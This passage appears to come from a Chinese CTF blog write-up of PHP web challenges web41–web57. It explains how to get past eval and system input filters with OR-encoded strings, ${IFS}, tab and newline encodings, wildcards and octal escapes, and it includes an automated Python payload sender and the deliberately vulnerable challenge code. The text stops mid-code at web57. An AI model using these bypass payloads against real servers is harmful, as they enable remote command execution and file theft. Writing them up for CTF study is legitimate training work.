<p>法二</p>
<p>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p>
<p>getcwd() 函数返回当前工作目录。它可以代替 pos(localeconv())</p>
<p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p>
<p>pos():输出数组第一个元素，不改变指针；</p>
<p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和 pos()一样</p>
<p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p>
<p>array_reverse():数组逆置</p>
<p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p>
<p>show_source():查看源码</p>
<p>pos() 函数返回数组中的当前元素的值。该函数是 current()函数的别名。</p>
<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
<p>提示：该函数不会移动数组内部指针。</p>
<p>相关的方法：</p>
<p>current()返回数组中的当前元素的值。</p>
<p>end()将内部指针指向数组中的最后一个元素，并输出。</p>
<p>next()将内部指针指向数组中的下一个元素，并输出。</p>
<p>prev()将内部指针指向数组中的上一个元素，并输出。</p>
<p>reset()将内部指针指向数组中的第一个元素，并输出。</p>
<p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p>
</blockquote>
<blockquote>
<p>我来解释这个 payload：?c&#x3D;eval(next(reset(get_defined_vars())));&amp;pay&#x3D;system(“tac flag.php”); &#x2F;&#x2F;get_defined_vars()用于以数组的形式返回所有已定义的变量值（包括 URL 屁股后面接的 pay），这里源码只定义了一个变量即 c，加上你引入的 pay 就两个变量值了。reset 用于将指向返回变量数组的指针指向第一个变量即 c，next 向前移动一位指针即 pay，eval 执行返回的值就是咱们定义的恶意代码。我这边去掉 system()函数前的分号了，也能出结果。</p>
</blockquote>
<h3 id="web41-未"><a href="#web41-未" class="headerlink" title="web41(未)"></a>web41(未)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>未过滤【或 | 】运算符<br>可以使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串</p>
<blockquote>
<p>首先进行代码审计：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_POST[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))&#123;</span><br><span class="line">        eval(&quot;echo($c);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>题目首先接收一个<strong>POST</strong>请求中名为’c’的参数，然后进行过滤，若未被过滤则执行 eval(“echo($c);”);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span><br></pre></td></tr></table></figure>

<p>该正则表达式的含义是：它会匹配任意一个数字字符、小写字母、”^”、”+”、”~”、”$”、”[“、”]”、”{“、”}”、”&amp;” 或 “-“，并且在匹配时忽略大小写。可以说过滤了大部分绕过方式，但是还剩下”|”没有过滤。所以这道题的目的就是要我们使用 ascii 码为 0-255 中没有被过滤的字符进行或运算，从而得到被绕过的字符。</p>
<p>思路如下：</p>
<ul>
<li>首先对 ascii 从 0-255 所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。</li>
<li>跟据题目要求，构造 payload 的原型，并将原型替换为或运算的结果</li>
<li>使用 POST 请求发送 c,获取 flag</li>
</ul>
<p>羽师傅先把或运算的结果放进 txt，然后查表构造 payload，用了两个脚本，这里给一个一体化的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import urllib</span><br><span class="line">from urllib import parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">contents = []</span><br><span class="line"></span><br><span class="line">for i in range(256):</span><br><span class="line">    for j in range(256):</span><br><span class="line">        hex_i = &#x27;&#123;:02x&#125;&#x27;.format(i)</span><br><span class="line">        hex_j = &#x27;&#123;:02x&#125;&#x27;.format(j)</span><br><span class="line">        preg = re.compile(r&#x27;[0-9]|[a-z]|\^|\+|~|\$|\[|]|\&#123;|&#125;|&amp;|-&#x27;, re.I)</span><br><span class="line">        if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))):</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            a = &#x27;%&#x27; + hex_i</span><br><span class="line">            b = &#x27;%&#x27; + hex_j</span><br><span class="line">            c = chr(int(a[1:], 16) | int(b[1:], 16))</span><br><span class="line">            if 32 &lt;= ord(c) &lt;= 126:</span><br><span class="line">                contents.append([c, a, b])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def make_payload(cmd):</span><br><span class="line">    payload1 = &#x27;&#x27;</span><br><span class="line">    payload2 = &#x27;&#x27;</span><br><span class="line">    for i in cmd:</span><br><span class="line">        for j in contents:</span><br><span class="line">            if i == j[0]:</span><br><span class="line">                payload1 += j[1]</span><br><span class="line">                payload2 += j[2]</span><br><span class="line">                break</span><br><span class="line">    payload = &#x27;(&quot;&#x27; + payload1 + &#x27;&quot;|&quot;&#x27; + payload2 + &#x27;&quot;)&#x27;</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = input(&#x27;url:&#x27;)</span><br><span class="line">payload = make_payload(&#x27;system&#x27;) + make_payload(&#x27;cat flag.php&#x27;)</span><br><span class="line">response = requests.post(URL, data=&#123;&#x27;c&#x27;: urllib.parse.unquote(payload)&#125;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>直接输入题目的 URL 就完事</p>
</blockquote>
<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong><code>&gt;/dev/null 2&gt;&amp;1</code></strong>：<br><strong>关键部分</strong>，这是一个 Shell 命令输出重定向技巧：</p>
<ul>
<li><code>&gt;/dev/null</code>：将标准输出（<code>stdout</code>）丢弃到空设备（不显示）。</li>
<li><code>2&gt;&amp;1</code>：将错误输出（<code>stderr</code>，文件描述符 2）重定向到标准输出（<code>stdout</code>，文件描述符 1），最终也被丢弃。</li>
</ul>
<p><strong>效果</strong>：命令执行后的所有输出（包括错误信息）都被隐藏，攻击者无法直接看到命令执行结果。</p>
</li>
</ol>
<p>假设你是一个餐厅老板（服务器），有两个 “传话筒”：</p>
<ol>
<li><strong>标准输出（stdout）</strong>：正常的订单信息（文件列表、命令结果）</li>
<li><strong>错误输出（stderr）</strong>：厨房报错（文件不存在、权限拒绝）</li>
</ol>
<p><strong>正常情况</strong>：<br>顾客（攻击者）点单（发送命令），你通过传话筒把结果喊回去（显示在网页上）。</p>
<p><strong>但这段代码做了什么？</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>相当于你把两个传话筒都剪断了，接到了一个 “黑洞”（<code>/dev/null</code>）：</p>
<ul>
<li><strong><code>&gt;/dev/null</code></strong>：把正常订单信息直接扔进垃圾桶</li>
<li><strong><code>2&gt;&amp;1</code></strong>：把厨房报错也重定向到和正常信息一样的 “黑洞”</li>
</ul>
<p><strong>结果</strong>：<br>顾客点了 “给我看菜单”（<code>ls /etc/passwd</code>），你确实去厨房查了菜单，但不管查到什么，都不会告诉顾客。顾客只能通过其他方式（比如观察餐厅灯光是否熄灭）猜测命令是否成功执行。</p>
<p>为什么攻击者喜欢这样？</p>
<ul>
<li><strong>隐藏踪迹</strong>：管理员查看日志时，只看到命令被执行，但看不到结果，很难发现异常。</li>
<li><strong>偷偷做事</strong>：攻击者可以执行 “下载病毒”“修改文件” 等操作，服务器表面看起来一切正常。</li>
</ul>
<p>生活类比</p>
<p>想象你家有个保姆，你允许她用微波炉热饭（执行命令），但她偷偷用微波炉烤手机（恶意操作），还把声音关掉（<code>&gt;/dev/null</code>），甚至把冒烟的警报器也拔掉（<code>2&gt;&amp;1</code>），你完全不知道她在干什么。</p>
<p><strong>永远不要让陌生人直接控制保姆！</strong><br>正确做法是：</p>
<ol>
<li>给保姆一个菜单（白名单），只允许她做菜单上的菜（预定义命令）</li>
<li>你亲自监督她做菜（验证用户输入）</li>
<li>保留监控录像（记录所有操作）</li>
</ol>
<blockquote>
<p>命令只是将错误输出重定向到了标准输出，并没有重定向标准输出，所以可以将错误输出重定向至&#x2F;dev&#x2F;null ?c&#x3D;cat flag.php &amp;2</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=tac flag.php;ls</span><br></pre></td></tr></table></figure>

<p><code>gsfdgdfg</code></p>
<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php||ls</span><br></pre></td></tr></table></figure>



<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac fla*.php||ls</span><br></pre></td></tr></table></figure>



<blockquote>
<p>服务器会重定向到 index.php，所以写入其他文件无法查看，直接修改 index.php 输出 flag。</p>
<p>tee 命令不仅会将输入内容写入文件，还会将其输出到标准输出</p>
<p>所以构造 playload：</p>
<p>c&#x3D;echo “” | tee index.php</p>
<p>再访问 index.php 就是 flag.php 的内容</p>
</blockquote>
<blockquote>
<hr>
<p>无回显方式查看 flag 既然跟前面几个一样，这次只不过加了过滤 flag, 可以通过 cp 命令将 flag.php 的内容 cp 成 txt 格式的，?c &#x3D; cp fla?.php 3.txt 后面直接访问 3.txt 就可以直接看到 flag</p>
</blockquote>
<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(! preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $ c))&#123;</span><br><span class="line">      system($c.&quot; &gt;/dev/null 2 &gt;&amp;1 &quot;);</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>关键是通配符</p>
<blockquote>
<p>几种绕过空格的方式 {cat, flag.txt} cat ${IFS}flag.txt cat$ IFS$9flag.txt cat &lt; flag.txt&#x2F;&#x2F;这俩 &lt;&gt; 貌似没啥用 cat &lt;&gt; flag.txt</p>
<p>cat%0afla?.php cat%09fla?.php 这俩的区别是后者用于语句中间，前者可以用来做末尾的截断</p>
</blockquote>
<blockquote>
<p>对于 “&lt;”和”&lt;&gt;” 的代替空格方式，要队 “&lt;”和”&lt;&gt;” url 编码，防止数据传输出现问题</p>
</blockquote>
<blockquote>
<p>?c &#x3D; tac &lt; fla%27%27g.php||</p>
<p>?c &#x3D; tac%09fla?.php||</p>
<p>?c &#x3D; ca\t &lt; fl\ag.php||</p>
<p>?c &#x3D; tac%09fla?.php%0Als</p>
<p>?c &#x3D; tail%09fl’’ag.php||ls</p>
<p>?c &#x3D; nl%09fl??.php%0a </p>
<p>?c &#x3D; tac%09 <code>which%09ls</code>%0a</p>
</blockquote>
<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>就是不屏蔽 tac</p>
<hr>
<p> if(!preg_match(“&#x2F;;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail&#x2F;i”, $c)){<br>        system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### web48</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> if(!preg_match(“&#x2F;;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`&#x2F;i”, $c)){<br>        system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; 还是使用前面两题的 payload ?c=nl%09fl??.php%0a nl 这是 Linux/Unix 命令 &quot;number lines&quot; 功能类似于 cat，但会在每行前面添加行号 用来替代被过滤的 cat 命令 %09 这是 ASCII 码表中制表符(Tab)的 URL 编码 十六进制值为 09，对应 Tab 字符 在命令行中，Tab 可以像空格一样分隔命令和参数 用来替代被过滤的空格字符 fl?? fl 是文件名的前两个字母，通常指 &quot;flag&quot; 每个 ? 是通配符，匹配任意单个字符 两个 ? 可以匹配 &quot;ag&quot;，组合起来就是 &quot;flag&quot; 这样绕过了对 &quot;flag&quot; 字符串的过滤 .php 文件扩展名，表示这是一个 PHP 文件 与前面的 fl?? 组合，可以匹配 &quot;flag.php&quot; 文件 %0a 这是换行符(LF)的 URL 编码 十六进制值为 0A，对应换行符 在命令执行时，会将后面的内容放到新的一行 使得 &gt;/dev/null 2&gt;&amp;1 重定向变成单独的一行 这样 nl 命令的输出就不会被重定向到 /dev/null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### web49</span><br><span class="line"></span><br><span class="line">​```php</span><br><span class="line">  if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac&lt;fla%27%27g.php||ls</span><br></pre></td></tr></table></figure>

<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ta\c&lt;fla%27%27g.php||ls</span><br></pre></td></tr></table></figure>

<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=t\ac&lt;fla%27%27g.php||ls</span><br></pre></td></tr></table></figure>



<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=ca\t$&#123;IFS&#125;/fla?||ls</span><br><span class="line">?c=nl$&#123;IFS&#125;/fla&#x27;&#x27;g%0a</span><br><span class="line">?c=t\ac$&#123;IFS&#125;fla%27%27g.php||ls</span><br></pre></td></tr></table></figure>

<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><code>system()</code>的特殊之处在于它在 “返回值用于赋值” 的同时，还会 “执行命令并输出结果”，这是由函数设计决定的，与赋值操作本身无关。</p>
<pre><code>  echo($c);
    $d = system($c);
    echo &quot;&lt;br&gt;&quot;.$d;
</code></pre>
<p>​<br>​    这三行里面有很多废话，实际上就等于 system($c);<br>​    所以直接把上面的 payload 删掉||和后面的内容就好了<br>​    ?c&#x3D;ca’’t${IFS}fla’’g.php</p>
<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解法一： 使用使用 mv 命令把 flag 文件重命名，再使用 uniq 查看 a.txt（如果第二步看不到，请右键查看文件源代码） 第一步：c= mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br><span class="line">第二步：c=uniq$&#123;IFS&#125;a.txt 解法二： c=uniq$&#123;IFS&#125;f???.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于过滤了字母，但没有过滤数字，我们尝试使用&#x2F;bin 目录下的可执行程序。</p>
<p>但因为字母不能传入，我们需要使用通配符?来进行代替</p>
<p>?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p>
<p>替换后变成</p>
<p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p>
</blockquote>
<blockquote>
<p>bash 无字母命令执行</p>
<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>

<p>会执行<code>ls</code></p>
<p>故 payload 是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
<blockquote>
<blockquote>
<p>&#x2F;?c&#x3D;$’\143\141\164’%20*</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">八进制序列解码后分别为 tac 和 flag.php。</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>
<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>



<p>php 上传的文件会临时放在&#x2F;tmp 目录下</p>
<p>经典无数字字母rce，</p>
<blockquote>
<p>前言</p>
<p>之前做过一道<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/108011373">红包题第二弹</a>，这里也是同样的解法，但是新学到了很多知识点，记录一下。</p>
<p>这个解法，p神的文章讲的很清楚<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109152405">https://blog.csdn.net/qq_44657899/article/details/109152405</a></p>
</blockquote>
<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span 